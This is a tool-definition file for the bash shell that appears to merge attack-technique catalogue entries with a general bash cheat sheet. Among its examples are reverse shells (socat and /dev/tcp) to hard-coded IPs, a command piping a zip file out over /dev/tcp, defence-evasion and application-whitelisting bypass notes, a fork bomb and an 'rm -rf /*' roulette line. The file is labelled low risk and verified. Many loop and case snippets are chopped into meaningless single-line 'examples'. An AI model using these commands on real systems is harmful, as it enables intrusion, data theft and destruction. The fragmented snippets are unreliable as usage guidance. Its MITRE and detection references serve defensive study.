---
id: system-shell-bash
namespace: system:shell:bash
name: bash
description: GNU Bourne-Again SHell
author: "Repository Maintainers"
version: "1.0.0"
capabilities:
  - system.shell.bash
  - system.shell.command
platforms:
  - linux
  - macos
  - windows
risk_level: low
trust_level: verified
execution_policy: enabled
architectures:
  - amd64
  - arm64
features:
  - local
  - interactive
parameters:
  - name: debug
    type: string
    required: false
    description: "--debugger --dump-po-strings --dump-strings --help --init-file --login
      --noediting --noprofile --norc --posix --pretty-print --rcfile --restricted
      --verbose --version"
    aliases:
      - --debug
  - name: flag-i
    type: string
    required: false
    description: "(invocation only)"
    aliases:
      - -i
      - -c
      - -O
  - name: flag-a
    type: string
    required: false
    description: "Set the flag-a parameter"
    aliases:
      - -a
      - -o
execution:
  template: "bash --debug {debug} -i {flag-i} -a {flag-a}"
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars:
  target: ip
  port: port
  shell: shell
examples:
  - description: "Basic usage with debug"
    command: "bash ${debug}"
  - description: "Display help message"
    command: "bash --help"
  - description: Performs execution of specified file, can be used as a defensive
      evasion.
    command: bash.exe -c "{CMD}"
  - description: Performs execution of specified file, can be used as a defensive
      evasion.
    command: bash.exe -c "socat tcp-connect:192.168.1.9:66 exec:sh,pty,stderr,setsid,sigint,sane"
  - description: Performs execution of specified file, can be used as a defensive
      evasion.
    command: bash.exe -c 'cat {PATH:.zip} > /dev/tcp/192.168.1.10/24'
  - description: Performs execution of specified file, can be used to bypass Application
      Whitelisting.
    command: bash.exe -c "{CMD}"
  - description: Execute a payload as a child process of `bash.exe` while masquerading
      as WSL.
    command: bash.exe
  - description: 'Darkiros UTILS: Search and replace within a file'
    command: sed -i 's/[search]/[replace]/g' [file]
  - description: 'Darkiros UTILS: Copy file frome remote server to local'
    command: scp [user]@[remote]:[file] [local]
  - description: 'Darkiros UTILS: Copy file from local to remote server'
    command: scp [file] [user]@[remote]:[path]
  - description: NetRunners revshell/shell
    command: bash -i >& /dev/tcp/{{IP}}/{{PORT}} 0>&1
  - description: 'To implement a for loop:'
    command: for WORD in LIST
  - description: 'cheat.sheets: bash'
    command: do
  - description: 'cheat.sheets: bash'
    command: COMMANDS
  - description: 'cheat.sheets: bash'
    command: done
  - description: 'For example:'
    command: for CurDay in Monday Tuesday Wednesday Thursday Friday Saturday Sunday
  - description: 'cheat.sheets: bash'
    command: do
  - description: 'cheat.sheets: bash'
    command: printf "%s\n" "$CurDay"
  - description: 'cheat.sheets: bash'
    command: done
  - description: 'To implement a case statement:'
    command: case $1 in
  - description: 'cheat.sheets: bash'
    command: 0)
  - description: 'cheat.sheets: bash'
    command: echo "Found a '0'." ;;
  - description: 'cheat.sheets: bash'
    command: 1)
  - description: 'cheat.sheets: bash'
    command: echo "Found a '1'." ;;
  - description: 'cheat.sheets: bash'
    command: 2)
  - description: 'cheat.sheets: bash'
    command: echo "Found a '2'." ;;
  - description: 'cheat.sheets: bash'
    command: 3*)
  - description: 'cheat.sheets: bash'
    command: echo "Something beginning with '3' found." ;;
  - description: 'cheat.sheets: bash'
    command: "'')"
  - description: 'cheat.sheets: bash'
    command: echo "Nothing (null) found." ;;
  - description: 'cheat.sheets: bash'
    command: '*)'
  - description: 'cheat.sheets: bash'
    command: echo "Anything else found." ;;
  - description: 'cheat.sheets: bash'
    command: esac
  - description: 'Turn on built-in Bash debugging output:'
    command: set -x
  - description: 'Turn the above off again:'
    command: set +x
  - description: Retrieve N-th piped command exit status
    command: printf 'foo' | grep -F 'foo' | sed 's/foo/bar/'
  - description: 'cheat.sheets: bash'
    command: 'echo ${PIPESTATUS[0]}  # replace 0 with N'
  - description: 'Lock file:'
    command: ( set -o noclobber; echo > my.lock ) || echo 'Failed to create lock file'
  - description: Fork bomb. Do not run this! Has the potential to wreak havoc. It
      repeatedly and quickly spawns a lot of processes until the system eventually
      locks up.
    command: ':(){ :|:& };:'
  - description: 'An alternative, easier-to-understand version without the obfuscation:'
    command: func(){ func | func & }; func
  - description: Unix Roulette, courtesy of Bigown's answer in the joke thread. DANGER!
      Don't execute! Luckily, most modern setups have `--preserve-root` on by default,
      so this will be null and void, but even so, not even remotely worth the risk!
    command: '[ $[ $RANDOM % 6 ] == 0 ] && rm -rf /* || echo Click #Roulette'
  - description: A for loop one-liner.
    command: for CurIter in {1..4}; do echo "$CurIter"; done
  - description: 'Alternative, slightly-cleaner syntax:'
    command: for CurIter in {1..4}; { echo "$CurIter"; }
  - description: Test for a variable being equal to (`-eq`) an integer (`0`).
    command: if [ $var -eq 0 ]; then
  - description: 'cheat.sheets: bash'
    command: printf "Variable '\$var' is equal to '0'.\n"
  - description: 'cheat.sheets: bash'
    command: fi
  - description: Test for a `PATH` executable existing as a file, but note that aliases
      and functions will also output and result in a `0` exit status.
    command: command -v ${program} >/dev/null 2>&1 || error "${program} not installed"
  - description: 'However, that is a solution commonly found in a script using the
      Bourne shell, so in this case, an alternative, Bash-like, and more accurate
      version could be:'
    command: if ! type -fP bash > /dev/null 2>&1; then
  - description: 'cheat.sheets: bash'
    command: "printf \"ERROR: Dependency 'bash' not met.\" >&2"
  - description: 'cheat.sheets: bash'
    command: exit 1
  - description: 'cheat.sheets: bash'
    command: fi
  - description: Send both STDOUT and STDERR from COMMAND to FILE.
    command: COMMAND > FILE 2>&1
  - description: Send STDOUT and STDERR from COMMAND to `/dev/null`, where data goes
      to die.
    command: COMMAND > /dev/null 2>&1
  - description: Pipe the STDOUT and STDERR from COMMAND_1 to COMMAND_2.
    command: COMMAND_1 |& COMMAND_2
  - description: Verbosely convert whitespaces (` `) to underscores (`_`) in file
      names.
    command: for name in *\ *; do mv -vn "$name" "${name// /_}"; done
  - description: Expand a regular variable.
    command: $Var
  - description: Some people like to cuddle the variable name with braces ('{' and
      '}') but this is usually superfluous and wasted keystrokes, unless you need
      to protect the variable name from having other characters included, as in the
      below example, or you're using one of the many features of parameter expansion.
    command: '"${Var}some text"'
  - description: Access a given index in an array. In this example, you don't technically
      need to specify the element, because by default the first element is used. As
      with many other languages, note that indices are 0-first, so 1 is the 2nd.
    command: ${Var[0]}
  - description: You can use arithmetic between '[' and ']' as well.
    command: ${Var[2+3]}
  - description: Expand variable to the length of that to which the variable would
      expand.
    command: ${#Var}
  - description: Expand array variable to the number of elements/indices. You may
      find that `[*]` works as well as `[@]`, in this case.
    command: ${#Var[@]}
  - description: Expand variable to a substring. In this case, imagine `Var` is equal
      to the string 'thing', but the offset is 2 and the length is 1, giving us an
      'i'.
    command: ${Var:2:1}
  - description: "Expand variable to a substring by removing the matched glob pattern
      from left to right. To make this global (IE: greedy) use two '#' characters.
      So, in this example, everything, from left to right, up to and including a 'T'
      or 't', will be removed, but it would only happen once."
    command: ${Var#*[Tt]}
  - description: As above, but from right to left. Use two '%' characters for a greedy
      match.
    command: ${Var%[Tt]*}
  - description: Change how the variable expands by using pattern substitution. This
      uses glob pattern matching, not REGEX. If the first '/' is instead '//', a greedy
      match is performed.
    command: ${Var/PATTERN/REPLACEMENT/}
  - description: A good example of the above, which will list directories in PATH
      which exist and are directories. It works because all instances of ':' are replaced
      with a whitespace, causing find(1) to see multiple directories (fields) in which
      to search.
    command: find ${PATH//:/ } -type d
  - description: Expand the variable to the string between `:-` and the closing `}`,
      if that variable doesn't already have a value. This can be useful to set a default.
    command: ${Var:-Default Value}
  - description: This is a way of displaying an error message if the contents of the
      variable is empty. It will also immediately exit with an exit status of 1.
    command: ${Var:?This is an error message.}
  - description: Indirect expansion exists in a couple of ways in BASH. If `Var` is
      equal to `OtherVar`, and that `OtherVar` is equal to `true`, the below example
      would expand to `true`.
    command: ${!Var}
  - description: Expand variable so that the first letter is uppercase. Use two '^'
      (carets) if you want the entire contents of the variable to change to uppercase.
    command: ${Var^}
  - description: As above, but convert to lowercase. Use two ',' characters to transform
      the entire string to which `Var` expands.
    command: ${Var,}
mitre_ids:
  - T1202
  - T1218
contributor: Oddvar Moe
techniques:
  - command-and-control
  - credential-access
  - defense-evasion
  - discovery
  - enumeration
  - execution
  - lateral-movement
  - persistence
  - process-manip
detections:
  - type: blockrule
    url: 
      https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules
  - type: sigma
    url: 
      https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_lolbin_bash.yml
  - type: ioc
    description: Child process from bash.exe
install:
    - method: apt
      package_name: "bash"
      commands:
        - "apt-get install -y bash"
---

# bash — GNU Bourne-Again SHell

## Overview

`bash` is a command-line utility for gnu bourne-again shell.

## Usage

```
bash --debug {debug} -i {flag-i} -a {flag-a}
```
